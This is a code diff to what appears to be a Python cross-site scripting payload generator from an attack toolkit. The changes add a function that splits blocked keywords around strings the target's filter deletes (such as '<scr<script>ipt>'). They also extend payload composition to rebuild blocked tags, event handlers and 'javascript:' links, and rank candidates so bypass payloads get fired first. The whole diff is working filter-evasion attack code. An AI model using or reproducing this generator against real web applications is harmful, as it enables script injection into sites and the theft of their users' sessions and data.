@@ -49,6 +49,13 @@ TAG_HANDLERS = [
     ("iframe", "onload", "", ("iframe_tag", "onload", "pair_iframe_onload")),
 ]
 
+# Nested tag-strip bypass (case "xss tag removed.md") is handled by the
+# generic `splitters` machinery inside compose() below: every keyword
+# item that came back deleted becomes a splitter, and any blocked
+# tag/handler/function atom is rebuilt by wrapping the splitter inside it
+# (<im<img>g>, on<scr>error, ...). rand_tag (<kmi> junk tag) is tried
+# first -- a generic tag-stripper can split ANYTHING.
+
 CONSUMING_TAGS = ["noscript", "style", "title", "textarea", "iframe", "script"]
 
 # map context string fragments -> internal context key
@@ -175,6 +182,16 @@ def breakers(ctx, quote):
     return [""]
 
 
+def split_str(target, s):
+    """Insert a filter-removed string s inside a blocked target at the
+    midpoint so the filter's removal merges the halves back into target
+    (split_str('<script>', '<xDh>') -> '<scr<xDh>ipt>').
+    Case: xss tag removed.md — any deleted string works as a splitter,
+    not just the classic <scr<script>ipt> pattern."""
+    k = max(1, len(target) // 2)
+    return target[:k] + s + target[k:]
+
+
 def avail_funcs(kw):
     """JS call primitives allowed by the keyword mask (Layer B/C gate).
     Missing keyword analysis -> everything assumed allowed (backward compat)."""
@@ -195,11 +212,14 @@ def avail_funcs(kw):
     return funcs
 
 
-def compose(ctx, quote, scores, kw=None):
+def compose(ctx, quote, scores, kw=None, kwv=None):
     """Assemble candidate payloads from grammar primitives.
     kw: keyword mask {name: bool} from the probe2 analysis (Layer B/C gate).
+    kwv: {name: (expected, got_back)} — the actual probed strings, needed to
+    build nested splitters from whatever string the filter deleted.
     Returns list of dicts: {payload, technique, case_ref, efficiency}."""
     kw = kw or {}
+    kwv = kwv or {}
     funcs = avail_funcs(kw)
     out = []
     marker = "vvm{id}"
@@ -225,6 +245,23 @@ def compose(ctx, quote, scores, kw=None):
 
     if ctx == "html":
         if tags_ok:
+            # Strings the filter deleted outright (item FAILed AND its
+            # reflection came back empty). Any one of them can be nested
+            # inside a blocked tag/keyword: the filter deletes the splitter
+            # and the fragments merge back (case: xss tag removed.md).
+            # rand_tag first — when even the random junk tag was stripped the
+            # filter is a generic tag-stripper that can split ANYTHING.
+            splitters = sorted(
+                ((n, e) for n, (e, g) in kwv.items()
+                 if not kw.get(n, True) and e and g == ""),
+                key=lambda p: (p[0] != "rand_tag", "<" not in p[1], p[0]))
+            rsplit = [s for _, s in splitters]
+
+            def fix(key, word, s):
+                """Split word with removed string s when its kw key was
+                blocked; leave it unchanged when it passed."""
+                return word if kw.get(key, True) else split_str(word, s)
+
             if script_ok:
                 for fn in funcs:
                     add(f"<script {marker}>{fn}</script>", "script injection", "body_direct")
@@ -233,13 +270,27 @@ def compose(ctx, quote, scores, kw=None):
                     for fn in funcs[:2]:
                         add(f"<ScRiPt {marker}>{fn}</ScRiPt>",
                             "case-mutated script tag", "tag_removed")
-                for fn in funcs:
-                    add(f"<scr<script>ipt {marker}>{fn}</scr<script>ipt>",
-                        "nested tag-strip bypass", "tag_removed")
-            for tag, ev, extra in handler_variants():
-                for fn in funcs[:2]:
-                    add(f"<{tag} {extra} {marker} {ev}={fn}>".replace("  ", " "),
-                        f"{tag} {ev} handler", "body_direct")
+                for s in rsplit[:3]:
+                    for fn in funcs[:2]:
+                        add(f"{split_str('<script>', s)} {marker}>{fn}"
+                            f"{split_str('</script>', s)}",
+                            f"nested tag-strip bypass ({s} splitter)", "tag_removed")
+            for tag, ev, extra, deps in TAG_HANDLERS:
+                if all(kw.get(d, True) for d in deps):
+                    for fn in funcs[:2]:
+                        add(f"<{tag} {extra} {marker} {ev}={fn}>".replace("  ", " "),
+                            f"{tag} {ev} handler", "body_direct")
+                else:
+                    # tag name / event handler / function blocked: rebuild the
+                    # blocked atoms by splitting them with a removed string
+                    for s in rsplit[:2]:
+                        fn0 = funcs[0] if funcs else "alert(1)"
+                        fname = re.split(r"[(`]", fn0)[0]
+                        add(f"{fix(tag + '_tag', '<' + tag, s)} {extra} {marker} "
+                            f"{fix(ev, ev, s)}="
+                            f"{fix(fname, fname, s)}{fn0[len(fname):]}>"
+                            .replace("  ", " "),
+                            f"removed-string splitter ({s})", "tag_removed")
             if kw.get("javascript_proto", True) and \
                     kw.get("proto_href", True) and funcs:
                 add(f'<a {marker} href="javascript:{funcs[0]}">XSS</a>',
@@ -248,6 +299,10 @@ def compose(ctx, quote, scores, kw=None):
                     and funcs:
                 add(f'<a {marker} href="JaVaScRiPt:{funcs[0]}">XSS</a>',
                     "case-mutated javascript: href", "protocol")
+            if not kw.get("javascript_proto", True) and rsplit and funcs:
+                add(f'<a {marker} href="{split_str("javascript:", rsplit[0])}'
+                    f'{funcs[0]}">XSS</a>',
+                    f"removed-string splitter ({rsplit[0]})", "tag_removed")
             if kw.get("svg_tag", True) and not kw.get("onload", True) \
                     and kw.get("case_onload", True):
                 for fn in funcs[:2]:
@@ -471,10 +526,13 @@ def main():
     # Layer B/C keyword mask (probe2) — optional; absent = assume all allowed
     kw_file = args.keywords or latest_log_path("xss_keyword_analysis", "json")
     kw_by_refl = {}
+    kwv_by_refl = {}
     if kw_file and os.path.exists(kw_file):
         kwdata = json.load(open(kw_file))
         for r in kwdata.get("results", []):
             kw_by_refl.setdefault(r["reflection_index"], {})[r["character_name"]] = r["passed"]
+            kwv_by_refl.setdefault(r["reflection_index"], {})[r["character_name"]] = \
+                (r.get("expected", ""), r.get("got_back", ""))
         print(f"Keyword mask:     {kw_file}\n")
     else:
         print("Keyword mask:     none found (run send_payloads.py --probe2 + "
@@ -492,9 +550,23 @@ def main():
         ctx = ctxs[0]
         scores = char_scores(results, rid)
         kw = kw_by_refl.get(rid, {})
+        kwv = kwv_by_refl.get(rid, {})
         quote_ch = detect_quote(source_html, "testing1")
-        cand = compose(ctx, quote_ch, scores, kw)
-        cand.sort(key=lambda c: -c["efficiency"])
+        cand = compose(ctx, quote_ch, scores, kw, kwv)
+        # rank on equal efficiency: direct payloads execute as-is;
+        # splitter probes test THIS filter's actual deletion set;
+        # blind mutations (case/entity) are last-resort guesses.
+        # Without tiers, --top N slots get spent on probes in
+        # insertion order and the working vector never gets fired.
+        def tier(c):
+            t = c["technique"]
+            if "splitter" in t or "bypass" in t:
+                return 1
+            if c["case_ref"] == "tag_removed" or "case-mutated" in t \
+                    or "entity" in t:
+                return 2
+            return 0
+        cand.sort(key=lambda c: (-c["efficiency"], tier(c)))
         cand = cand[: args.top]
 
         print(f"--- Reflection [{rid}]  context={ctx}  quote='{quote_ch or 'unquoted'}'")
